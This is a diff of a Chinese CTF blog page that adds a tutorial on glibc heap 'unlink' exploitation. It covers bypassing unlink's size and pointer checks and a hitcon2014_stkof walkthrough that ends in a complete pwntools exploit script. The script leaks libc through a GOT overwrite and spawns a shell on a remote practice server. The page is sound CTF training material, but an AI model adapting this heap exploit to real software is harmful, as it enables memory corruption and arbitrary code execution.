@@ -195,16 +195,76 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>May 30, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>178</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>4406</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
         <p>以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki</p>
-<h1 id="不安全的unlike"><a href="#不安全的unlike" class="headerlink" title="不安全的unlike"></a>不安全的unlike</h1><h3 id="什么叫unlike"><a href="#什么叫unlike" class="headerlink" title="什么叫unlike"></a>什么叫unlike</h3><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlike</p>
+<h1 id="不安全的unlike"><a href="#不安全的unlike" class="headerlink" title="不安全的unlike"></a>不安全的unlike</h1><h2 id="什么叫unlike"><a href="#什么叫unlike" class="headerlink" title="什么叫unlike"></a>什么叫unlike</h2><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlike</p>
 <p>基本过程如下图所示</p>
 <p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>上述的操作进行了如下的赋值</p>
+<ul>
+<li><p>*( fd + 0x18 ) = bk</p>
+</li>
+<li><p>*( bk + 0x10 ) = fd</p>
+</li>
+</ul>
+<h3 id="unlink中的检查"><a href="#unlink中的检查" class="headerlink" title="unlink中的检查"></a>unlink中的检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure>
+
+<h2 id="利用unlink"><a href="#利用unlink" class="headerlink" title="利用unlink"></a>利用unlink</h2><p>要利用unlink首先要绕过上面提到的两个检查：</p>
+<ol>
+<li><p>size检查：</p>
+<p>在堆中有两个地方存储了P的size：第一个是当前P-&gt;size，第二个是next_chunk-&gt;prev_size，比较两者大小</p>
+</li>
+<li><p>fd和bk检查：</p>
+<p>检查P是否在双向链表中，在双向链表中有两个指针指向P：第一个是FD-&gt;bk，第二个是BK-&gt;fd</p>
+</li>
+</ol>
+<h3 id="第一种思路"><a href="#第一种思路" class="headerlink" title="第一种思路"></a>第一种思路</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li>存在UAF可以修改P的fd和bk</li>
+<li>存在一个指针指向P</li>
+</ol>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
+<li>通过UAF漏洞修改chunk0-&gt;fd=G_ptr-0x18，chunk0-&gt;bk=G_ptr-0x10，绕过fd和bk检查</li>
+<li>free下一个chunk，chunk0和chunk1合并，chunk0发生unlink，修改了G_ptr的值</li>
+</ol>
+<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写。</p>
+<p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">在这里插入图片描述</span></p>
+<h3 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li>可以修改p的下一个chunk-&gt;pre_size和inuse位</li>
+<li>存在一个指针指向chunk p的内容部分</li>
+</ol>
+<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
+<li><p>伪造fake_chunk：fakechunk-&gt;size=chunk0-0x10，可以绕过size检查</p>
+<p>fakechunk-&gt;fd=&amp;G_ptr-0x18，fakechunk-&gt;bk = &amp;G_ptr-&gt;0x10，绕过fd和bk检查</p>
+</li>
+<li><p>修改下一个chunk的prev_size=chunksize§-0x10。因为fakechunk比chunk0小0x10</p>
+</li>
+<li><p>修改下一个chunk的inuse位</p>
+</li>
+<li><p>free下一个堆块chunk1。fakechunk和chunk1合并，fakechunk发生unlink，修改了G_ptr的值</p>
+</li>
+</ol>
+<h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写</p>
+<p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">在这里插入图片描述</span></p>
+<h2 id="例题hitcon2014-stkof"><a href="#例题hitcon2014-stkof" class="headerlink" title="例题hitcon2014_stkof"></a>例题hitcon2014_stkof</h2><p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831204845498</span></p>
+<p>常规checksec一下，64位，开了NX、Canary</p>
+<p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831211106261</span></p>
+<p>进入IDA，额，有个选项为4的功能似乎并没有作用，然后溢出点存在与修改函数中，对于我们能修改的长度是不存在什么限制的，所以能很轻易的造成堆溢出</p>
+<p>题目没开PIE，所以堆结构的地址是已知的，整个程序不存在打印功能。这边的思路是：</p>
+<p>先通过unlink把堆结构上的堆指针改为在堆结构前的地址，从而可以控制堆结构，达成任意写；然后先修改 <code>s[1] = free@got</code> 地址，同时修改 <code>s[2] = puts@got</code> 地址；再一次编辑，实现覆写free@got为puts@plt,从而当调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。然后free(s[2])，相当于执行了puts（puts@got）通过puts泄露puts@got的值，获得libc基地址，然后就可以获得system；最后修改再把free@got修改为system，对着写有/bin/sh\x00的堆块释放</p>
+<p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831213326412</span></p>
+<p>首先，这边第一个申请的chunk是不能被使用的，由于程序本身没有进行 setvbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，所以我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。具体的看ctfwiki这题的<a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO 缓冲区问题分析</a>。所以第一个堆块不能用来做fakechunk</p>
+<p>所以这边进行创造fake_chunk要注意！首先，堆块的索引从1开始；其次第一个不能用，所以我们要从堆结构的第二个地方作为地址</p>
+<p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831214046823</span></p>
+<p><img   class="lazyload" data-original="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831214232302</span></p>
+<p>触发unlink，造成合并，同时堆结构指针的值被改为其地址 - 0x18</p>
+<p>然后就是按照思路所说的，去修改堆结构即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 防止合并</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 
       </section>
       <section class="extra">
@@ -244,7 +304,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlike"><span class="toc-text">不安全的unlike</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E5%8F%ABunlike"><span class="toc-text">什么叫unlike</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlike"><span class="toc-text">不安全的unlike</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E5%8F%ABunlike"><span class="toc-text">什么叫unlike</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink%E4%B8%AD%E7%9A%84%E6%A3%80%E6%9F%A5"><span class="toc-text">unlink中的检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8unlink"><span class="toc-text">利用unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF"><span class="toc-text">第一种思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%80%9D%E8%B7%AF"><span class="toc-text">第二种思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98hitcon2014-stkof"><span class="toc-text">例题hitcon2014_stkof</span></a></li></ol></li></ol>
   </aside>
 
         
